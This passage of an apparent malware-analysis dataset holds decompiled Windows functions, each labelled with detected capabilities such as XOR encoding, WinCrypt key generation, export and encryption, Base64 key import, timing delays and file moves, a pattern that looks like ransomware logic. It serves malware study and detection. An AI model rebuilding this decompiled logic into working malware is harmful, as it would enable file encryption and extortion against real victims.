(*_sym.imp.KERNEL32.dll_ExitThread)(0);\ncode_r0x0040af28:\n            iVar2 = fcn.0040d46a(var_a4h);\n        } while (iVar2 == 0);\n        puVar4 = arg_ch;\n        if (arg_20h < 0x10) {\n            puVar4 = &arg_ch;\n        }\n        iVar3 = (*pcVar1)(puVar4, arg_1ch, 1, iVar2, &var_a4h, 0, 0);\n    } while (iVar3 == 0);\n    arg_8h_01 = fcn.0040d46a(0x408);\n    fcn.0040a72c(&var_84h);\n    fcn.0040a787(iVar2, var_a4h);\n    *(arg_8h + 0x14) = 0xf;\n    *(arg_8h + 0x10) = 0;\n    *arg_8h = 0;\n    fcn.0040720a(iVar2);\n    fcn.0040d69d(arg_8h_01);\n    fcn.0040d69d(iVar2);\n    if (var_a4h != 0) {\n        do {\n            puVar4 = var_a0h;\n            if (var_8ch < 0x10) {\n                puVar4 = &var_a0h;\n            }\n            fcn.0040a493(*(puVar4 + uVar5));\n            uVar5 = uVar5 + 1;\n        } while (uVar5 < var_a4h);\n    }\n    fcn.00405c90(1);\n    fcn.00405c90(1);\n    fcn.0040b39f(arg_8h_00);\n    return;\n}\n",
        "token_count": 819
    },
    "0040df51": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040df51(uint arg_8h)\n\n{\n    fcn.0040de11(arg_8h, 0, 0);\n    return;\n}\n",
        "token_count": 41
    },
    "0040f543": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x0040f557)\n// WARNING: Removing unreachable block (ram,0x0040f55d)\n// WARNING: Removing unreachable block (ram,0x0040f55f)\n\nvoid fcn.0040f543(void)\n\n{\n    return;\n}\n",
        "token_count": 66
    },
    "004118e5": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __cdecl fcn.004118e5(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h)\n\n{\n    uint in_EAX;\n    uint uVar1;\n    uint var_8h;\n    uint var_4h;\n    \n    uVar1 = fcn.004129f3(arg_8h, arg_ch, arg_10h, arg_14h, in_EAX, 0, 0, 0);\n    return uVar1;\n}\n",
        "token_count": 111
    },
    "00405bcc": {
        "rules": [
            "encode data using XOR"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n\nvoid __fastcall fcn.00405bcc(int32_t param_1, uint8_t *param_2)\n\n{\n    uint8_t uVar1;\n    int32_t in_EAX;\n    int32_t iVar2;\n    int32_t iVar3;\n    int32_t var_8h;\n    uint var_1h;\n    \n    if (param_1 != 0) {\n        var_8h = in_EAX - param_2;\n        iVar3 = (param_1 - 1U >> 4) + 1;\n        do {\n            iVar2 = 0x10;\n            do {\n                *param_2 = *param_2 ^ param_2[var_8h];\n                param_2 = param_2 + 1;\n                iVar2 = iVar2 + -1;\n            } while (iVar2 != 0);\n            fcn.00405ab1();\n            uVar1 = 1;\n            do {\n                fcn.00405ad3();\n                fcn.00405af5();\n                fcn.00405b3e();\n                fcn.00405ab1();\n                uVar1 = uVar1 + 1;\n            } while (uVar1 < 0xe);\n            fcn.00405ad3();\n            fcn.00405af5();\n            fcn.00405ab1();\n            var_8h = var_8h + -0x10;\n            iVar3 = iVar3 + -1;\n        } while (iVar3 != 0);\n    }\n    return;\n}\n",
        "token_count": 350
    },
    "00406c90": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382",
            "move file"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00406c90(uint *arg_8h, uint noname_1, uint noname_2, uint noname_3, uint noname_4, uint32_t arg_1ch)\n\n{\n    uint *arg_8h_00;\n    uint *var_20h;\n    uint32_t var_ch;\n    uint32_t var_4h;\n    \n    var_4h = *0x401304 ^ &stack0xfffffffc;\n    fcn.00407ab8(0x4049bc);\n    if (var_ch < 8) {\n        var_20h = &var_20h;\n    }\n    arg_8h_00 = arg_8h;\n    if (arg_1ch < 8) {\n        arg_8h_00 = &arg_8h;\n    }\n    (*_sym.imp.KERNEL32.dll_MoveFileW)(arg_8h_00, var_20h);\n    fcn.00407574(1);\n    fcn.00407574(1);\n    fcn.0040b39f(arg_8h_00);\n    return;\n}\n",
        "token_count": 249
    },
    "00407b3a": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00407b3a(int32_t param_1)\n\n{\n    int32_t in_EAX;\n    \n    if ((*(param_1 + 0x14) - *(param_1 + 0x10) < *(in_EAX + 0x10)) &&\n       (*(param_1 + 0x10) <= *(in_EAX + 0x14) - *(in_EAX + 0x10))) {\n        fcn.00407dad(param_1, 0);\n    }\n    else {\n        fcn.00407c89(in_EAX, 0);\n    }\n    fcn.00407236();\n    return;\n}\n",
        "token_count": 147
    },
    "0040901b": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382",
            "contain loop",
            "create new key via CryptAcquireContext"
        ],
        "decompiled_code": "\nvoid fcn.0040901b(void)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    uint uVar5;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    pcVar1 = _sym.imp.ADVAPI32.dll_CryptAcquireContextA;\n    var_ch = 0;\n    var_8h = 0;\n    if (*0x414378 != 0) goto code_r0x00409067;\n    iVar2 = (*_sym.imp.ADVAPI32.dll_CryptAcquireContextA)(0x414378, 0, 0x40527c, 1, 0);\n    if (iVar2 != 0) goto code_r0x00409067;\n    iVar2 = (*pcVar1)(0x414378, 0, 0x40527c, 1, 8);\n    if (iVar2 != 0) goto code_r0x00409067;\n    do {\n        do {\n            do {\n                do {\n                    do {\n                        do {\n                            do {\n                                do {\n                                    do {\n                                        do {\n                                            do {\n                                                (*_sym.imp.KERNEL32.dll_ExitThread)(0);\ncode_r0x00409067:\n                                                if (*0x41437c != 0) {\n                                                    (*_sym.imp.ADVAPI32.dll_CryptDestroyKey)(*0x41437c);\n                                                }\n                                                iVar2 = (*_sym.imp.ADVAPI32.dll_CryptGenKey)\n                                                                  (*0x414378, 1, 0x8000001, 0x41437c);\n                                                pcVar1 = _sym.imp.ADVAPI32.dll_CryptExportKey;\n                                            } while (iVar2 == 0);\n                                            iVar2 = (*_sym.imp.ADVAPI32.dll_CryptExportKey)\n                                                              (*0x41437c, 0, 7, 0, 0, &var_ch);\n                                        } while (iVar2 == 0);\n                                        iVar2 = fcn.0040d46a(var_ch);\n                                    } while (iVar2 == 0);\n                                    iVar3 = (*pcVar1)(*0x41437c, 0, 7, 0, iVar2, &var_ch);\n                                } while (iVar3 == 0);\n                                iVar3 = (*pcVar1)(*0x41437c, 0, 6, 0, 0, &var_8h);\n                            } while (iVar3 == 0);\n                            iVar3 = fcn.0040d46a(var_8h);\n                        } while (iVar3 == 0);\n                        iVar4 = (*pcVar1)(*0x41437c, 0, 6, 0, iVar3, &var_8h);\n                        pcVar1 = _sym.imp.CRYPT32.dll_CryptBinaryToStringA;\n                    } while (iVar4 == 0);\n                    var_4h = 0;\n                    iVar4 = (*_sym.imp.CRYPT32.dll_CryptBinaryToStringA)(iVar3, var_8h, 1, 0, &var_4h);\n                } while (iVar4 == 0);\n                uVar5 = fcn.0040b394(var_4h);\n                iVar3 = (*pcVar1)(iVar3, var_8h, 1, uVar5, &var_4h);\n            } while (iVar3 == 0);\n            fcn.0040d260(uVar5);\n            fcn.004075b4();\n            fcn.0040d306(uVar5);\n            var_4h = 0;\n            iVar3 = (*pcVar1)(iVar2, var_ch, 1, 0, &var_4h);\n        } while (iVar3 == 0);\n        uVar5 = fcn.0040b394(var_4h);\n        iVar2 = (*pcVar1)(iVar2, var_ch, 1, uVar5, &var_4h);\n    } while (iVar2 == 0);\n    fcn.0040d260(uVar5);\n    fcn.004075b4();\n    fcn.0040d306(uVar5);\n    return;\n}\n",
        "token_count": 946
    },
    "004092b1": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382",
            "contain loop",
            "encrypt or decrypt via WinCrypt"
        ],
        "decompiled_code": "\nvoid __cdecl\nfcn.004092b1(uint arg_8h, uint *arg_ch, uint noname_2, uint noname_3, uint noname_4, int32_t arg_1ch, uint32_t arg_20h)\n\n{\n    code *pcVar1;\n    uint *puVar2;\n    int32_t iVar3;\n    uint *puVar4;\n    code *pcVar5;\n    uint arg_8h_00;\n    int32_t var_218h;\n    uint var_214h;\n    uint var_210h;\n    uint var_20ch;\n    uint var_208h;\n    uint var_204h;\n    uint32_t var_4h;\n    \n    pcVar5 = _sym.imp.ADVAPI32.dll_CryptEncrypt;\n    var_4h = *0x401304 ^ &stack0xfffffffc;\n    var_214h = arg_8h;\n    var_218h = arg_1ch;\n    puVar4 = arg_ch;\n    if (arg_20h < 0x10) {\n        puVar4 = &arg_ch;\n    }\n    puVar4 = puVar4 + arg_1ch;\n    puVar2 = arg_ch;\n    if (arg_20h < 0x10) {\n        puVar2 = &arg_ch;\n    }\n    if (puVar2 != puVar4) {\n        iVar3 = &var_204h - puVar2;\n        do {\n            *(iVar3 + puVar2) = *puVar2;\n            puVar2 = puVar2 + 1;\n        } while (puVar2 != puVar4);\n    }\n    var_208h = 0;\n    arg_8h_00 = *0x41437c;\n    iVar3 = (*_sym.imp.ADVAPI32.dll_CryptEncrypt)(*0x41437c, 0, 1, 0, 0, &var_208h, 0);\n    if (iVar3 != 0) goto code_r0x00409337;\n    do {\n        do {\n            do {\n                (*_sym.imp.KERNEL32.dll_ExitThread)(0);\ncode_r0x00409337:\n                iVar3 = (*pcVar5)(*0x41437c, 0, 1, 0, &var_204h, &var_218h, var_208h);\n                pcVar1 = _sym.imp.CRYPT32.dll_CryptBinaryToStringA;\n            } while (iVar3 == 0);\n            var_20ch = 0;\n            iVar3 = (*_sym.imp.CRYPT32.dll_CryptBinaryToStringA)(&var_204h, var_208h, 1, 0, &var_20ch);\n            pcVar5 = pcVar1;\n        } while (iVar3 == 0);\n        var_210h = fcn.0040b394(var_20ch);\n        iVar3 = (*pcVar1)(&var_204h, var_208h, 1, var_210h, &var_20ch);\n    } while (iVar3 == 0);\n    fcn.0040720a(var_210h);\n    fcn.0040d306(var_210h);\n    fcn.00405c90(1);\n    fcn.0040b39f(arg_8h_00);\n    return;\n}\n",
        "token_count": 737
    },
    "00409f32": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382",
            "contain loop",
            "encrypt or decrypt via WinCrypt"
        ],
        "decompiled_code": "\nvoid __cdecl\nfcn.00409f32(uint arg_8h, uint *arg_ch, uint noname_2, uint noname_3, uint noname_4, int32_t arg_1ch, uint32_t arg_20h)\n\n{\n    code *pcVar1;\n    uint *puVar2;\n    int32_t iVar3;\n    uint *puVar4;\n    code *pcVar5;\n    uint arg_8h_00;\n    int32_t var_418h;\n    uint var_414h;\n    uint var_410h;\n    uint var_40ch;\n    uint var_408h;\n    uint var_404h;\n    uint32_t var_4h;\n    \n    pcVar5 = _sym.imp.ADVAPI32.dll_CryptEncrypt;\n    var_4h = *0x401304 ^ &stack0xfffffffc;\n    var_414h = arg_8h;\n    var_418h = arg_1ch;\n    puVar4 = arg_ch;\n    if (arg_20h < 0x10) {\n        puVar4 = &arg_ch;\n    }\n    puVar4 = puVar4 + arg_1ch;\n    puVar2 = arg_ch;\n    if (arg_20h < 0x10) {\n        puVar2 = &arg_ch;\n    }\n    if (puVar2 != puVar4) {\n        iVar3 = &var_404h - puVar2;\n        do {\n            *(iVar3 + puVar2) = *puVar2;\n            puVar2 = puVar2 + 1;\n        } while (puVar2 != puVar4);\n    }\n    var_408h = 0;\n    arg_8h_00 = *0x414380;\n    iVar3 = (*_sym.imp.ADVAPI32.dll_CryptEncrypt)(*0x414380, 0, 1, 0, 0, &var_408h, 0);\n    if (iVar3 != 0) goto code_r0x00409fb8;\n    do {\n        do {\n            do {\n                (*_sym.imp.KERNEL32.dll_ExitThread)(0);\ncode_r0x00409fb8:\n                iVar3 = (*pcVar5)(*0x414380, 0, 1, 0, &var_404h, &var_418h, var_408h);\n                pcVar1 = _sym.imp.CRYPT32.dll_CryptBinaryToStringA;\n            } while (iVar3 == 0);\n            var_40ch = 0;\n            iVar3 = (*_sym.imp.CRYPT32.dll_CryptBinaryToStringA)(&var_404h, var_408h, 1, 0, &var_40ch);\n            pcVar5 = pcVar1;\n        } while (iVar3 == 0);\n        var_410h = fcn.0040b394(var_40ch);\n        iVar3 = (*pcVar1)(&var_404h, var_408h, 1, var_410h, &var_40ch);\n    } while (iVar3 == 0);\n    fcn.0040720a(var_410h);\n    fcn.0040d306(var_410h);\n    fcn.00405c90(1);\n    fcn.0040b39f(arg_8h_00);\n    return;\n}\n",
        "token_count": 736
    },
    "0040b016": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0040b016(uint arg_8h)\n\n{\n    int32_t iVar1;\n    code *pcVar2;\n    uint *in_EAX;\n    uint *puVar3;\n    uint32_t uVar4;\n    uint arg_8h_00;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    pcVar2 = _sym.imp.KERNEL32.dll_MultiByteToWideChar;\n    iVar1 = in_EAX[4];\n    puVar3 = in_EAX;\n    if (0xf < in_EAX[5]) {\n        puVar3 = *in_EAX;\n    }\n    uVar4 = (*_sym.imp.KERNEL32.dll_MultiByteToWideChar)(0, 0, puVar3, iVar1 + 1, 0, 0);\n    arg_8h_00 = fcn.0040b394(-(uVar4 * 2 >> 0x20 != 0) | uVar4 * 2);\n    if (0xf < in_EAX[5]) {\n        in_EAX = *in_EAX;\n    }\n    (*pcVar2)(0, 0, in_EAX, iVar1 + 1, arg_8h_00, uVar4);\n    fcn.00407390(arg_8h_00);\n    fcn.0040d306(arg_8h_00);\n    return arg_8h;\n}\n",
        "token_count": 320
    },
    "0040b0fe": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382",
            "delay execution",
            "contain loop"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.0040b0fe(int32_t arg_8h)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    uchar *unaff_EBX;\n    uint arg_8h_00;\n    uint var_40h;\n    uint var_3ch;\n    int32_t var_2ch;\n    uint var_20h;\n    uint var_10h;\n    uint var_ch;\n    uint32_t var_4h;\n    \n    var_4h = *0x401304 ^ &stack0xfffffffc;\n    arg_8h_00 = 5;\n    (*_sym.imp.KERNEL32.dll_Sleep)();\n    iVar1 = fcn.0040d772(0);\n    iVar2 = fcn.0040d6d7();\n    fcn.0040d73f(iVar2 * iVar1 * 0x96);\n    fcn.0040720a(0x4056d8);\n    *(unaff_EBX + 0x10) = 0;\n    *(unaff_EBX + 0x14) = 0xf;\n    *unaff_EBX = 0;\n    iVar1 = *(unaff_EBX + 0x10);\n    while (iVar1 != arg_8h) {\n        uVar3 = fcn.0040d751();\n        var_10h = 0;\n        var_ch = 0xf;\n        var_20h._0_1_ = 0;\n        fcn.00407403(uVar3 % (var_2ch - 1U), 1);\n        fcn.00407c89(&var_20h, 0);\n        fcn.00405c90(1);\n        iVar1 = *(unaff_EBX + 0x10);\n    }\n    fcn.00405c90(1);\n    fcn.0040b39f(arg_8h_00);\n    return;\n}\n",
        "token_count": 442
    },
    "00410d24": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00410d24(int32_t arg_8h)\n\n{\n    if ((arg_8h != 0) && (*(arg_8h + -8) == 0xdddd)) {\n        fcn.0040d69d(arg_8h + -8);\n    }\n    return;\n}\n",
        "token_count": 71
    },
    "004091da": {
        "rules": [
            "decode data using Base64 via WinAPI"
        ],
        "decompiled_code": "\nvoid fcn.004091da(void)\n\n{\n    code *pcVar1;\n    uint uVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    uint uVar5;\n    code *pcVar6;\n    uint pbData;\n    uint dwDataLen;\n    \n    pcVar6 = _sym.imp.CRYPT32.dll_CryptStringToBinaryA;\n    dwDataLen = 0;\n    uVar5 = 0x401e84;\n    uVar2 = *0x401e84;\n    if (*0x401e98 < 0x10) {\n        uVar2 = 0x401e84;\n    }\n    iVar3 = (*_sym.imp.CRYPT32.dll_CryptStringToBinaryA)(uVar2, *0x401e94, 1, 0, &dwDataLen, 0, 0);\n    if (iVar3 != 0) goto code_r0x0040921f;\ncode_r0x00409218:\n    do {\n        do {\n            do {\n                (*_sym.imp.KERNEL32.dll_ExitThread)(0);\ncode_r0x0040921f:\n                iVar3 = fcn.0040d46a(dwDataLen);\n            } while (iVar3 == 0);\n            uVar2 = *0x401e84;\n            if (*0x401e98 < 0x10) {\n                uVar2 = uVar5;\n            }\n            iVar4 = (*pcVar6)(uVar2, *0x401e94, 1, iVar3, &dwDataLen, 0, 0);\n            pcVar1 = _sym.imp.ADVAPI32.dll_CryptAcquireContextA;\n        } while (iVar4 == 0);\n        if (*0x414378 == 0) {\n            uVar5 = 0x414378;\n            iVar4 = (*_sym.imp.ADVAPI32.dll_CryptAcquireContextA)(0x414378, 0, 0x40527c, 1, 0);\n            pcVar6 = pcVar1;\n            if (iVar4 == 0) {\n                iVar4 = (*pcVar1)(0x414378, 0, 0x40527c, 1, 8);\n                if (iVar4 == 0) goto code_r0x00409218;\n            }\n        }\n        iVar3 = (*_sym.imp.ADVAPI32.dll_CryptImportKey)(*0x414378, iVar3, dwDataLen, 0, 0, 0x41437c);\n        if (iVar3 != 0) {\n            return;\n        }\n    } while( true );\n}\n",
        "token_count": 581
    },
    "004093f4": {
        "rules": [
            "decode data using Base64 via WinAPI"
        ],
        "decompiled_code": "\nvoid fcn.004093f4(void)\n\n{\n    code *pcVar1;\n    uint uVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    uint uVar5;\n    code *pcVar6;\n    uint pbData;\n    uint dwDataLen;\n    \n    pcVar6 = _sym.imp.CRYPT32.dll_CryptStringToBinaryA;\n    dwDataLen = 0;\n    uVar5 = 0x401e68;\n    uVar2 = *0x401e68;\n    if (*0x401e7c < 0x10) {\n        uVar2 = 0x401e68;\n    }\n    iVar3 = (*_sym.imp.CRYPT32.dll_CryptStringToBinaryA)(uVar2, *0x401e78, 1, 0, &dwDataLen, 0, 0);\n    if (iVar3 != 0) goto code_r0x00409439;\ncode_r0x00409432:\n    do {\n        do {\n            do {\n                (*_sym.imp.KERNEL32.dll_ExitThread)(0);\ncode_r0x00409439:\n                iVar3 = fcn.0040d46a(dwDataLen);\n            } while (iVar3 == 0);\n            uVar2 = *0x401e68;\n            if (*0x401e7c < 0x10) {\n                uVar2 = uVar5;\n            }\n            iVar4 = (*pcVar6)(uVar2, *0x401e78, 1, iVar3, &dwDataLen, 0, 0);\n            pcVar1 = _sym.imp.ADVAPI32.dll_CryptAcquireContextA;\n        } while (iVar4 == 0);\n        if (*0x414384 == 0) {\n            uVar5 = 0x414384;\n            iVar4 = (*_sym.imp.ADVAPI32.dll_CryptAcquireContextA)(0x414384, 0, 0x40527c, 1, 0);\n            pcVar6 = pcVar1;\n            if (iVar4 == 0) {\n                iVar4 = (*pcVar1)(0x414384, 0, 0x40527c, 1, 8);\n                if (iVar4 == 0) goto code_r0x00409432;\n            }\n        }\n        iVar3 = (*_sym.imp.ADVAPI32.dll_CryptImportKey)(*0x414384, iVar3, dwDataLen, 0, 0, 0x414380);\n        if (iVar3 != 0) {\n            return;\n        }\n    } while( true );\n}\n",
        "token_count": 581
    },
    "00407ba2": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00407ba2(char **arg_8h, char *arg_ch, char *arg_10h)\n\n{\n    char *pcVar1;\n    char *in_EAX;\n    \n    if (arg_ch != arg_10h) {\n        do {\n            if (*arg_ch == *in_EAX) break;\n            arg_ch = arg_ch + 1;\n        } while (arg_ch != arg_10h);\n    }\n    pcVar1 = arg_ch;\n    if (arg_ch == arg_10h) {\n        *arg_8h = arg_ch;\n        return;\n    }\n    while (pcVar1 = pcVar1 + 1,  pcVar1 != arg_10h) {\n        if (*pcVar1 != *in_EAX) {\n            *arg_ch = *pcVar1;\n            arg_ch = arg_ch + 1;\n        }\n    }\n    *arg_8h = arg_ch;\n    return;\n}\n",
        "token_count": 209
    },
    "0040b394": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nvoid fcn.0040b394(uint param_1)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    uint auStack20 [3];\n    uint uStack8;\n    \n    do {\n        iVar2 = fcn.0040d46a(param_1);\n        if (iVar2 != 0) {\n            return;\n        }\n        iVar2 = fcn.0040e317(param_1);\n    } while (iVar2 != 0);\n    if ((*0x4135ac & 1) == 0) {\n        *0x4135ac = *0x4135ac | 1;\n        uStack8 = 0x402108;\n        fcn.0040b856(&uStack8);\n        *0x4135a0 = 0x402100;\n        fcn.0040b834(0x412f3d);\n    }\n    fcn.0040b96c(0x4135a0);\n    auStack20[0] = 0x402100;\n    fcn.0040d957(auStack20, 0x413200);\n    pcVar1 = swi(3);\n    (*pcVar1)();\n    return;\n}\n",
        "token_count": 265
    },
    "0040e20e": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid __cdecl fcn.0040e20e(uint arg_8h)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t *arg_8h_00;\n    int32_t *piVar3;\n    int32_t *piVar4;\n    int32_t unaff_EBP;\n    uint var_1ch;\n    uint var_4h;\n    \n    fcn.0040dfc0(0x413050, 0xc);\n    fcn.0040f8db(0xe);\n    *(unaff_EBP + -4) = 0;\n    arg_8h_00 = *0x413928;\n    iVar1 = *(unaff_EBP + 8);\n    iVar2 = *(iVar1 + 4);\n    if (iVar2 != 0) {\n        piVar3 = 0x413924;\n        do {\n            piVar4 = piVar3;\n            *(unaff_EBP + -0x1c) = arg_8h_00;\n            if (arg_8h_00 == NULL) goto code_r0x0040e252;\n            piVar3 = arg_8h_00;\n        } while (*arg_8h_00 != iVar2);\n        piVar4[1] = arg_8h_00[1];\n        fcn.0040d69d(arg_8h_00);\ncode_r0x0040e252:\n        fcn.0040d69d(*(iVar1 + 4));\n        *(iVar1 + 4) = 0;\n    }\n    *(unaff_EBP + -4) = 0xfffffffe;\n    fcn.0040e275();\n    fcn.0040e005();\n    return;\n}\n",
        "token_count": 399
    },
    "0040b1c7": {
        "rules": [
            "get common file path"
        ],
        "decompiled_code": "\nvoid fcn.0040b1c7(void)\n\n{\n    uint *arg_8h;\n    uint hwndOwner;\n    uint32_t var_4h;\n    \n    var_4h = *0x401304 ^ &stack0xfffffffc;\n    (*_sym.imp.SHELL32.dll_SHGetFolderPathW)(0, 0x28, 0, 0, &hwndOwner);\n    arg_8h = &hwndOwner;\n    fcn.00407390(arg_8h);\n    fcn.0040b39f(arg_8h);\n    return;\n}\n",
        "token_count": 126
    }
}